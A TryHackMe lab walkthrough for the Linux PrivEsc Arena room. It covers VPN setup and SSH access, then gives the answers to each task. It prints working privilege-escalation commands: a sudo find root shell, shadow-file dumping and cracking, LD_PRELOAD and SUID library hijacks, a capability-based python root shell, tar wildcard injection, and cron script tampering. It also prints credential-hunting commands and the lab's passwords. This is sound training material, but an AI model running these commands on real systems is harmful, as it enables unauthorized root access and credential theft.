
# TryHackMe - Connect to VPN & Access Lab Machine (Linux PrivEsc / Lab Steps)

> Use these steps only in authorized labs (TryHackMe). They show how to download and use the OpenVPN config, confirm your interfaces, start the lab VM from the website, and SSH into the VM.

---

## 1. Download OpenVPN configuration (TryHackMe)

1. Login to TryHackMe.  
2. Go to **Manage your account → Access → VPN** (or **VPN settings**).  
3. Under **Access via OpenVPN / Machines**, select a VPN server and **Download** the `.ovpn` configuration file.  
4. Save the downloaded file (usually in `~/Downloads`).

---

## 2. Prepare on your Kali / Linux machine

### Change to downloads directory and list file

```bash
cd ~/Downloads
ls -lh *.ovpn                 # confirm the filename, e.g. thm-<user>.ovpn
```

Expected output (example):
```bash
-rw-r--r-- 1 user user 12K Aug 13 12:34 thm-config.ovpn
```

### Check current network interfaces

```bash
ip a
```

Expected output: 

```bash
1: lo: <LOOPBACK> ...
2: wlan0: <BROADCAST,MULTICAST> ...
3: eth0: ...
```

---
## 3. Connect to TryHackMe VPN
### Run OpenVPN with sudo and the downloaded config:

```bash
sudo openvpn filename.ovpn
```

- Enter your sudo password when prompted.
- Keep this terminal open while VPN is connected.

Successful connection shows lines like:

```bash
Initialization Sequence Completed
...
/sbin/ip addr add dev tun0 <vpn-ip>/xx
```

### Verify VPN interface in another terminal
Open a new terminal tab/window and run:

```bash
ip a
```

Expected output:

```bash
# new interface
tun0: <POINTOPOINT,MULTICAST> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.14.5/32 scope global tun0
```

`tun0` with an IP indicates the VPN tunnel is active.

---

## 4. Confirm connection on TryHackMe website

- Refresh the TryHackMe VPN page or the machine/access panel.
- The website should show **"Connected"** for your VPN session and allow you to **Join** or **Start** the machine.

---

## 5. Start the lab machine and get target IP

- In the lab room (e.g., "Linux PrivEsc Arena"), click **Start Machine** (or **Deploy**).
- The lab will show a **target IP** for SSH or services (visible in the web lab panel or instructions).

---

## 6. SSH into the lab machine

```bash
ssh tcm@<target-IP> -o HostKeyAlgorithms=+ssh-rsa
```

Example expected:
```
The authenticity of host '<target-IP> (<target-IP>)' can't be established.
ECDSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
tcm@<target-IP>'s password:    # if password auth
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.x)...
```

---

## 7. Perform lab tasks

- Once SSH'ed in, follow the room tasks (enumeration, privilege escalation checks).
- Typical first commands to run on the target:

```bash
whoami
id
uname -a
pwd
ls -la
```

---

## 8. Troubleshooting & Tips

- If `sudo openvpn` fails: ensure OpenVPN is installed (`sudo apt install openvpn`) and you are in the directory with the `.ovpn` file.

- If `tun0` does not appear: check OpenVPN output for errors (auth, cert, permission).
    
- Use a separate terminal for `ip a` and SSH so you can monitor the VPN connection.
    
- Use the lab-provided username and connection info do not brute force.
    
- Always use labs only for testing; never attack unauthorized systems.

---

## TASK 1 — No questions (information only)

No commands required.

---

## TASK 2 — No questions (connect to machine)

Login credentials provided in the room:

`Username: tcm Password: Hacker123`

---

## TASK 3 — “What kernel exploit works against this system?”

### Step 1 — Check kernel version

```bash
uname -a cat /proc/version
```
### Step 2 — Run exploit suggester

```bash
home/tcm/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

**This tool identifies “Dirty COW” as the valid exploit.**

### Answer:
```bash
Dirty COW (CVE-2016-5195)
```


---

## TASK 4 — “What user’s credentials were exposed in the OpenVPN auth file?”

### Step 1 — View the OpenVPN auth file

```bash
cat /etc/openvpn/auth.txt
```
This file contains stored VPN username/password in plaintext.

### Answer:
```bash
user
```

---

## TASK 5 — “What was the password discovered in TCM’s bash history?”

### Step 1 — Read bash history
```bash
cat ~/.bash_history | grep -i pass
```
Searches the shell history for commands containing the word “pass”, often revealing credentials.

### Answer:
```bash
password123
```


---

## TASK 6 — “What are the permissions on the /etc/shadow file?”

### Step 1 — List permissions
```bash
ls -l /etc/shadow
```
Displays who can read/write the system’s hashed password file.

### Answer:
```bash
-rw-rw-r--
```

---

## TASK 7 — “What is the full path of the private key file you discovered?”

### Step 1 — Search for private SSH keys
```bash
find / -name id_rsa 2>/dev/null
```
Searches the entire filesystem for private RSA SSH keys.
### Answer:
```bash
/backups/supersecretkeys/id_rsa
```

---

## TASK 8 — “What program does TCM have sudo privileges to run?”

### Step 1 — Check sudo privileges
```bash
sudo -l
```
Lists commands the current user can run as root without a password.

```bash
sudo find . -exec /bin/sh \;
```
Uses `find`'s `-exec` option to run a root shell.

### Answer:
```bash
find
```


---

## TASK 9 — “What is the root password?”

### Step 1 — Abuse Apache config loading
```bash
sudo apache2 -f /etc/shadow
```
```Forces Apache (running as root) to print the contents of `/etc/shadow`.

### Step 2 — Crack the hash
```bash
echo "<HASH>" > root.hash
```
Stores the extracted root hash into a file.

```bash
john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Uses John the Ripper to crack the root password.
### Answer:
```bash
password123
```


---

## TASK 10 — “Exploit the LD_PRELOAD vulnerability. What is the name of the file you created?”

### Step 1 — Create malicious shared object
```bash
cat << 'EOF' > x.c ... EOF
```
Creates a C file that spawns a root shell when loaded.

### Step 2 — Compile
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```
Compiles the C file into a shared library (.so) for LD_PRELOAD injection.

### Step 3 — Execute with sudo
```bash
sudo LD_PRELOAD=/tmp/x.so apache2
```
Forces Apache to load your malicious `.so` file before executing.

### Answer:
```bash
x.so
```

---

## TASK 11 — “What file did the SUID binary expect that we were able to hijack?”

### Step 1 — Inspect SUID binary
```bash
strings /usr/local/bin/suid-so
```
Reveals readable strings inside the binary.

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i open
```
Shows system calls, including attempts to open missing `.so` files.

**Binary looks for:**
```bash
/home/tcm/.config/libcalc.so
```

### Step 2 — Create malicious library
```bash
mkdir -p /home/tcm/.config
```
Creates the directory expected by the program.

```bash
cat << 'EOF' > /home/tcm/.config/libcalc.c ... EOF
```
Creates a malicious `.so` that makes a SUID root bash shell.

### Step 3 — Compile
```bash
gcc -shared -fPIC -o /home/tcm/.config/libcalc.so /home/tcm/.config/libcalc.c
```
Compiles your malicious shared library.

### Step 4 — Execute SUID binary
```bash
/usr/local/bin/suid-so
```
Loads the malicious `.so` as root.

### Answer:
```bash
libcalc.so
```

---

## TASK 12 — “What CVE is being exploited?”

### Step 1 — Check nginx version
```bash
nginx -v
```
Displays the currently running nginx version; used to check if vulnerable.

### Answer:
```bash
CVE-2016-1247`
```
---

## TASK 13 — “What is the last line shown in the ‘strings’ output?”

### Step 1 — Run strings
```bash
strings /usr/local/bin/suid-env
```
Shows the hardcoded commands inside the binary.

### Answer:
```bash
service apache2 start
```

---

## TASK 14 — “What is the last line shown in the ‘strings’ output?”

### Step 1 — Run strings
```bash
strings /usr/local/bin/suid-env2
```
Same idea as previous: look at embedded commands.

### Answer:
```bash
/usr/sbin/service apache2 start
```


---

## TASK 15 — “What file has the ‘cap_setuid’ capability set?”

### Step 1 — List capabilities
```bash
getcap -r / 2>/dev/null
```
Searches for binaries with special Linux capabilities (like setting UID).

### Answer:
```bash
/usr/bin/python2.6
```

### Exploit
```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Uses Python's ability to set UID to 0 (root) and run a shell.

---

## TASK 16 — “What is the name of the cron job script?”

### Step 1 — Check cron jobs
```bash
cat /etc/crontab
```
Displays system-wide cron tasks executed by root.

### Answer:
```bash
overwrite.sh
```

---

## TASK 17 — “What wildcard file did you create?”

### Wildcard exploit files
```bash
`touch /home/tcm/--checkpoint=1
```
Creates a filename interpreted as an option by tar or rsync.

```bash
touch "/home/tcm/--checkpoint-action=exec=sh runme.sh"
```
Forces the cron job to execute your script.

### Answer:
```bash
--checkpoint=1
```
---

## TASK 18 — “What file did you modify to gain root?”

### Step 1 — Modify the cron script
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
Injects malicious code that runs as root during the cron job.

### Answer:
```bash
/usr/local/bin/overwrite.sh
```

---

## TASK 19 — “Which option must be set in /etc/exports to exploit NFS?”

### Step 1 — View NFS exports
```bash
cat /etc/exports
```
Displays exported directories and their permissions/options.

### Required exploit option:
```bash
no_root_squash
```
This allows remote root users to remain root on mounted shares.

### Answer:
```bash
no_root_squash
```

